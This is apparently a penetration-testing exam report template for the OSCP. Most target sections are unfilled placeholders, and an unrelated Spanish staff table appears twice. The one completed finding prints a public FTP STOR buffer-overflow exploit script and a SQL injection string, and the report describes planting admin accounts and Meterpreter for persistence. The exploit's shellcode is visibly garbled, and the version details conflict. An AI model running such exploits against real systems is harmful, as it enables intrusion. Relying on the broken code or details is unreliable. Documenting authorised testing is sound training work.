---
title: "Offensive Security Certified Professional"
subtitle: "Exam Report"
author: "student@youremailaddress.com"
date: "April 8, 2026"
version: "OSID: OS-XXXXXXX"
description: >
  This report documents all efforts conducted during the OSCP exam.
  It contains methodology, findings, exploitation steps, and proof
  of successful compromise for each target in scope.
---

# Introduction

The Offensive Security Exam penetration test report contains all efforts that were
conducted in order to pass the Offensive Security course. This report should contain
all items that were used to pass the overall exam and it will be graded from a
standpoint of correctness and fullness to all aspects of the exam. The purpose of
this report is to ensure that the student has a full understanding of penetration
testing methodologies as well as the technical knowledge to pass the qualifications
for the Offensive Security Certified Professional.

## Objective

The objective of this assessment is to perform an internal penetration test against
the Offensive Security Lab and Exam network. The student is tasked with following a
methodical approach in obtaining access to the objective goals. This test should
simulate an actual penetration test and how you would start from beginning to end,
including the overall report.

## Requirements

The student will be required to fill out this penetration testing report fully and
to include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable
- Any additional items that were not included

| ID | Nombre | Rol       | Estado   |
| :- | :----- | :-------- | :------- |
| 01 | Ana    | Analista  | Activo   |
| 02 | Carlos | Pentester | Activo   |
| 03 | Lucía  | DevOps    | Inactivo |
| 04 | Miguel | Red Team  | Activo   |

# High-Level Summary

John Doe was tasked with performing an internal penetration test towards Offensive
Security Labs. An internal penetration test is a dedicated attack against internally
connected systems. The focus of this test is to perform attacks, similar to those of
a hacker and attempt to infiltrate Offensive Security's internal lab systems — the
THINC.local domain. John's overall objective was to evaluate the network, identify
systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming
vulnerabilities identified on Offensive Security's network. John was able to gain
access to multiple machines, primarily due to outdated patches and poor security
configurations. During the testing, John had administrative level access to multiple
systems. All systems were successfully exploited and access granted.

Systems compromised:

- **Active Directory Set:**
  - HOSTNAME — Name of initial exploit
  - HOSTNAME — Name of initial exploit
  - HOSTNAME — Name of initial exploit
- **Standalone 1** — HOSTNAME — Name of initial exploit
- **Standalone 2** — HOSTNAME — Name of initial exploit
- **Standalone 3** — HOSTNAME — Name of initial exploit

## Recommendations

John recommends patching the vulnerabilities identified during the testing to ensure
that an attacker cannot exploit these systems in the future. These systems require
frequent patching and once patched, should remain on a regular patch program to
protect against additional vulnerabilities discovered at a later date.

# Methodologies

John utilized a widely adopted approach to performing penetration testing that is
effective in testing how well the Offensive Security Labs and Exam environments are
secured. Below is a breakout of how John was able to identify and exploit the
variety of systems and includes all individual vulnerabilities found.

## Information Gathering

The information gathering portion of a penetration test focuses on identifying the
scope of the penetration test. During this penetration test, John was tasked with
exploiting the lab and exam network. The specific IP addresses were:

**Exam Network:** 172.16.203.133, 172.16.203.134, 172.16.203.135, 172.16.203.136

## Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information
about what services are alive on a system or systems. This is valuable for an attacker
as it provides detailed information on potential attack vectors into a system.

## Penetration

The penetration testing portions of the assessment focus heavily on gaining access to
a variety of systems. During this penetration test, John was able to successfully gain
access to **X** out of **X** systems.

## Maintaining Access

Maintaining access to a system is important to ensure that we can return after initial
exploitation. John added administrator and root level accounts on all systems
compromised. In addition, a Metasploit meterpreter service was installed on each
machine to ensure that additional access could be re-established.

## House Cleaning

After the trophies on the exam network were completed, John removed all user accounts,
passwords, and Meterpreter services installed on each system. Offensive Security
should not have to remove any user accounts or services from the system.

# Independent Challenges

## Target 1 — 192.168.x.x

### Service Enumeration

| **Server IP Address** | **Ports Open**                              |
|:------------------|:----------------------------------------|
| 192.168.1.1       | **TCP:** 21, 22, 25, 80, 443            |
|                   |                                         |
Upon manual enumeration of the available FTP service, John noticed it was running an
outdated version 2.3.4 that is prone to a remote buffer overflow vulnerability.

![Descripción del escaneo Nmap](img/nmap.png){ width=8cm }

### Initial Access — Buffer Overflow

**Vulnerability Explanation:** Ability Server 2.34 is subject to a buffer overflow
vulnerability in the STOR field. Attackers can use this vulnerability to cause
arbitrary remote code execution and take complete control over the system.

**Vulnerability Fix:** The publishers of Ability Server have issued a patch to fix
this known issue: http://www.code-crafters.com/abilityserver/

**Severity:** **\textcolor{red}{Critical}**

**Steps to reproduce the attack:** The operating system was different from the known
public exploit. A rewritten exploit was needed in order for successful code execution
to occur. Once rewritten, a targeted attack was performed on the system which gave
John full administrative access.

**Proof of Concept:**
\newpage

```python
###############################################
# Ability Server 2.34 FTP STOR Buffer Overflow
# 21 Oct 2004 - muts
###############################################

import ftplib
from ftplib import FTP
import struct

print "\n\n#########################################"
print "\nAbility Server 2.34 FTP STOR Buffer Overflow"
print "\nFor Educational Purposes Only!\n"
print "#########################################"

sc  = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5eaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
sc += "\x81\x73\x17\xe0\x66\x1c\xc2\x83\xeb\xfc\xe2"
# ... (shellcode continues)

# RET Windows 2000 Server SP4
buffer = '\x41'*966 + struct.pack('<L', 0x7C2FA0F7) + '\x42'*32 + sc

try:
    ftp = FTP('127.0.0.1')
    ftp.login('ftp', 'ftp')
    print "\nEvil Buffer sent..."
    print "\nTry connecting with netcat to port 4444."
except:
    print "\nCould not connect to FTP Server."
try:
    ftp.transfercmd("STOR " + buffer)
except:
    print "\nDone."
```

### Privilege Escalation — MySQL Injection

**Vulnerability Explanation:** After establishing a foothold on the target, John
noticed a custom web application running on port 80 that was prone to SQL Injection.
Using Chisel for port forwarding, John was able to access the application and extract
database root credentials that matched the local administrator account.

**Vulnerability Fix:** The application must be programmed to properly sanitize
user-input data. The database user should run with least privilege, sensitive data
must be encrypted, and custom error messages should be implemented.

**Severity:** Critical

**Proof of Concept:**

```sql
SELECT * FROM login WHERE id = 1 OR 1=1 AND user LIKE "%root%"
```

### Post-Exploitation

**local.txt:** `HASH_VALUE_HERE`

**proof.txt:** `HASH_VALUE_HERE`

---

## Target 2 — 192.168.x.x

### Service Enumeration

| Server IP Address | Ports Open                              |
|:------------------|:----------------------------------------|
| 192.168.1.2       | **TCP:** 22, 55, 90, 80, 8080           |

### Initial Access — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

```bash
# Proof of Concept code here
```

**local.txt:** `HASH_VALUE_HERE`

### Privilege Escalation — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**
![Descripción del escaneo Nmap](img/nmap.png)

**Steps to reproduce the attack:**

```bash
# Escalation code here
```

### Post-Exploitation

**proof.txt:** `HASH_VALUE_HERE`

---

## Target 3 — 192.168.x.x

### Service Enumeration

| Server IP Address | Ports Open                               |
|:------------------|:-----------------------------------------|
| 192.168.1.3       | **TCP:** 1433, 3389 / **UDP:** 1434, 161 |
|                   | x                                        |

### Initial Access — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

```bash
# Proof of Concept code here
```

**local.txt:** `HASH_VALUE_HERE`

### Privilege Escalation — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

### Post-Exploitation

**proof.txt:** `HASH_VALUE_HERE`

---

# Active Directory Set

| IP Address   | Ports Open                                |
|:-------------|:------------------------------------------|
| 192.168.x.x  | **TCP:** 1433, 3389 / **UDP:** 1434, 161  |
| 192.168.x.x  | **TCP:** 1433, 3389 / **UDP:** 1434, 161  |
| 192.168.x.x  | **TCP:** 1433, 3389 / **UDP:** 1434, 161  |

## Hostname1 — 192.168.x.x

### Initial Access — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

```bash
# Proof of Concept code here
```

**local.txt:** `HASH_VALUE_HERE`

### Privilege Escalation — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

### Post-Exploitation

**proof.txt:** `HASH_VALUE_HERE`

---

## Hostname2 — 192.168.x.x

### Initial Access — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

```bash
# Proof of Concept code here
```

**local.txt:** `HASH_VALUE_HERE`

### Privilege Escalation — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

### Post-Exploitation

**proof.txt:** `HASH_VALUE_HERE`

---

## Hostname3 — 192.168.x.x

### Initial Access — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

```bash
# Proof of Concept code here
```

**local.txt:** `HASH_VALUE_HERE`

### Privilege Escalation — XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

> Please see Appendix 1 for the complete Windows Buffer Overflow code.

### Post-Exploitation

**proof.txt:** `HASH_VALUE_HERE`

| ID  | Nombre   | Rol        | Estado   |
|-----|----------|------------|----------|
| 01  | Ana      | Analista   | Activo   |
| 02  | Carlos   | Pentester  | Activo   |
| 03  | Lucía    | DevOps     | Inactivo |
| 04  | Miguel   | Red Team   | Activo   |

---

# Additional Items

This section is placed for any additional items that were not mentioned in the
overall report.
